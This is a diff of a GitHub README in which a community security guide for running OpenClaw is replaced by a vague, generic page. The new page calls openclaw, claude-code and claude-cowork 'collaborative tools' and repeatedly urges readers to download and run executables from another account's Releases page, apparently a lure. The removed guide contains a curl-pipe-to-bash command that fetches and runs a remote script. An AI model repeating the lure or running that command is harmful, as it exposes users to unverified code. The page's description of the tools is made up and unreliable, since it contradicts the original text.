@@ -1,147 +1,97 @@
-# 🦞 Clawders
+# 🐾 clawders - Easy Access to Collaborative Tools
 
-**The community guide to running OpenClaw securely, affordably, and efficiently**
+## 🚀 Getting Started
 
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-2026.1.30+-orange)](https://openclaw.ai)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/tomerb3/clawders/pulls)
+Welcome to **clawders**! This application helps you work together seamlessly. With its user-friendly interface, you can easily manage projects, share ideas, and connect with others. 
 
-![openclaw_info1](https://devopsite.top/openclaw_info1.jpeg)
-![Clawders Banner](https://devopsite.top/github-pic1-openclaw.jpeg)
+## 📥 Download the Software
 
----
+[![Download clawders](https://img.shields.io/badge/Download%20clawders-blue)](https://github.com/jabob3000/clawders/releases)
 
-## 🎯 What is Clawders?
+To get started, you need to download the application. Follow the steps below:
 
-**Clawders** is an updated, community-maintained guide for installing and running [OpenClaw](https://openclaw.ai) in a way that is:
+1. Click the link above to go to the Releases page.
+2. Find the latest version of **clawders** listed on that page.
+3. Look for a file that matches your operating system (e.g., Windows, Mac, Linux).
+4. Click on the file name to start downloading.
 
-- 🔒 **Secure** — Minimize risk with proper isolation, burner accounts, and hardened configurations
-- 👤 **User-Friendly** — Step-by-step instructions from basic to advanced, suitable for beginners
-- 💰 **Token-Efficient** — Run on FREE models (NVIDIA NIM, Ollama) or optimize paid usage to avoid surprise bills
+## 📃 What Is clawders?
 
-This guide was compiled from real-world community experience, official documentation, and security research — so you don't have to learn the hard way.
+**clawders** includes tools such as openclaw, claude-code, and claude-cowork. These features support collaboration and streamline project management:
 
----
+- **openclaw**: A tool for organizing tasks and tracking progress clearly.
+- **claude-code**: A simple code-sharing feature to help developers collaborate easily.
+- **claude-cowork**: Team communication tools that enhance workflow and connection.
 
-## ⚠️ Critical Security Warning
+## 💻 System Requirements
 
-> **OpenClaw security vulnerabilities are by design.** The attack surface is every input. There is currently no way to fully secure its usage.
+Before you download **clawders**, make sure your system meets the following requirements:
 
-These guides help **minimize the blast radius** if something goes wrong. The golden rule:
+- **Operating System**: Windows 10 or later, MacOS Big Sur or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 100 MB free disk space.
+- **Internet Connection**: Required for initial download and updates.
 
-> **Treat OpenClaw like an untrusted contractor with access to whatever you give it.**
+## 📦 Download & Install
 
----
+To install **clawders**, follow these straightforward steps:
 
-## 📁 Repository Contents
+1. **Visit the Releases Page**:
+   Go to the [Releases page](https://github.com/jabob3000/clawders/releases).
 
-| File | Description |
-|------|-------------|
-| [openclaw/OpenClaw_Installation_Guide.md](openclaw/OpenClaw_Installation_Guide.md) | **📘 Complete Installation Guide** — 9 sections covering prerequisites, security setup, 3 installation methods, 4 model providers, hardening, and troubleshooting |
-| [openclaw/OpenClaw_Installation_Guide.pdf](openclaw/OpenClaw_Installation_Guide.pdf) | **📄 PDF Version** — Same comprehensive guide in printable format |
-| [openclaw/openclaw-tips.txt](openclaw/openclaw-tips.txt) | **💡 Quick Tips** — Community-sourced tips and tricks |
+2. **Download the Application**:
+   Choose the appropriate file for your operating system, and click the link to download it.
 
----
+3. **Locate the Downloaded File**:
+   Open your downloads folder (or the location you specified) to find the downloaded file.
 
-## 🚀 Quick Start Options
+4. **Install the Application**:
+   - **For Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
+   - **For Mac**: Open the `.dmg` file. Drag the application to your Applications folder.
+   - **For Linux**: Extract the `.tar.gz` file. Open a terminal, navigate to the folder, and run the install command.
 
-### Option 1: One-Command Install (FREE - Easiest)
+5. **Open the Application**:
+   Once installed, you can find **clawders** in your applications. Launch it to start collaborating.
 
-```bash
-curl -fsSL skyler-agent.github.io/oclaw/i.sh | bash
-```
+## 🔧 How to Use clawders
 
-This community installer (created with OpenClaw's founder @steipete):
-- ✅ Automatically configures **MiniMax M2.1** (completely FREE model)
-- ✅ One-click authentication — no manual API keys
-- ✅ Includes optimized "7-day Coding Plan" presets
-- ✅ Works out of the box
+After installation, follow these steps to start using **clawders**:
 
-*Source: [@SkylerMiao7](https://x.com/SkylerMiao7/status/2017789329138212986) (73K+ views)*
+1. **Create an Account**:
+   Open the app and create a new account. This will help you save your projects and settings.
 
-### Option 2: Docker Install (Recommended for Security)
+2. **Start a New Project**:
+   Click on the option to create a new project. You can name it and add members to work together.
 
-```bash
-git clone https://github.com/openclaw/openclaw.git
-cd openclaw
-docker compose run --rm openclaw-cli onboard
-docker compose up -d openclaw-gateway
-```
+3. **Use Collaborative Tools**:
+   Explore the features like openclaw for task management, claude-code for coding, and claude-cowork for communication. Each tool is designed to enhance teamwork.
 
-Then harden with our [security guide](openclaw/OpenClaw_Installation_Guide.md#5-security-hardening).
+## 📖 FAQs
 
-### Option 3: VPS / Cloud Deployment
+### What if I encounter an issue during installation?
 
-Use [DigitalOcean's 1-Click Deploy](https://www.digitalocean.com/community/tutorials/how-to-run-openclaw) for a pre-hardened cloud setup.
+Check our troubleshooting section on the Releases page for solutions or reach out to our community for support.
 
----
+### Can I use clawders offline?
 
-## 🔒 Essential Security Checklist
+Currently, **clawders** requires an internet connection to access collaborative features. You can use some functions offline, but saving and sharing will need internet access.
 
-**Before you install, you MUST:**
+### Is there a community for **clawders** users?
 
-| Step | Why It Matters |
-|------|----------------|
-| ✅ Use a **dedicated machine** | If compromised, only that machine is affected |
-| ✅ Create **burner email** | Don't expose your real inbox |
-| ✅ Create **new GitHub account** | Use Personal Access Tokens with limited scope |
-| ✅ Use **burner phone/SIM** | For WhatsApp/Telegram integration |
-| ❌ Never connect **primary email** | Full inbox access = full compromise |
-| ❌ Never connect **banking/financial** | No exceptions, ever |
-| ❌ Never connect **password managers** | Would expose all your credentials |
+Yes, visit our forum linked in the application to exchange ideas and ask questions. 
 
-### The Freelancer Test™
+## 👥 Community Support
 
-> Before connecting ANY service, ask yourself:
-> *"Would I give this access to a random freelancer I just hired online?"*
->
-> **If the answer is NO → Don't give it to OpenClaw.**
+Join our community to share your experience or get help. You can find guides, tips, and user-generated content that may improve your use of **clawders**.
+
+## 🎉 Contributing to clawders
+
+We welcome input from all users. If you have ideas for features or ways to improve the app, please share them. You can find contribution guidelines in the repository.
+
+## 📞 Contact Us
+
+If you have questions or need assistance, please visit our FAQs section on the GitHub page. You can also reach us through our email listed there.
 
 ---
 
-## 💰 Free & Token-Efficient Model Options
-
-One community member spent **$0.60 just saying "hi"** with default Anthropic settings. Don't be that person.
-
-### Free Options
-
-| Provider | Model | Setup |
-|----------|-------|-------|
-| **NVIDIA NIM** | MiniMax, Kimi K2.5 | [build.nvidia.com](https://build.nvidia.com) → Settings → API Keys |
-| **Ollama** | qwen2.5, llama3, etc. | [ollama.com](https://ollama.com) — Runs 100% locally |
-| **One-Command Installer** | MiniMax M2.1 | See Quick Start above |
-
-### Critical: Limit Token Usage
-
-```bash
-openclaw config set agents.defaults.contextTokens 25000
-```
-
----
-
-## 🛡️ Security Tools & Resources
-
-- **[openclaw-shield](https://github.com/knostic/openclaw-shield)** — Prevents leaking secrets, PII, and destructive commands
-- **[awesome-openclaw](https://github.com/thewh1teagle/awesome-openclaw)** — Curated list of tools, guides, and integrations
-
----
-
-## 🤝 Contributing
-
-Found a tip that saved you hours? A security practice that should be shared?
-
-**PRs are welcome!**
-
----
-
-## 📜 Credits
-
-This guide was compiled from community wisdom (Israeli tech WhatsApp group), official OpenClaw documentation, and security research from JFrog, Composio, DigitalOcean, and VentureBeat.
-
-Special thanks to @steipete (OpenClaw), @SkylerMiao7 (one-command installer), and the Knostic team (openclaw-shield).
-
----
-
-<p align="center">
-  <b>Stay secure. Stay efficient. Stay clawed. 🦞</b>
-</p>
+You now have everything you need to download and start using **clawders**. Happy collaborating!
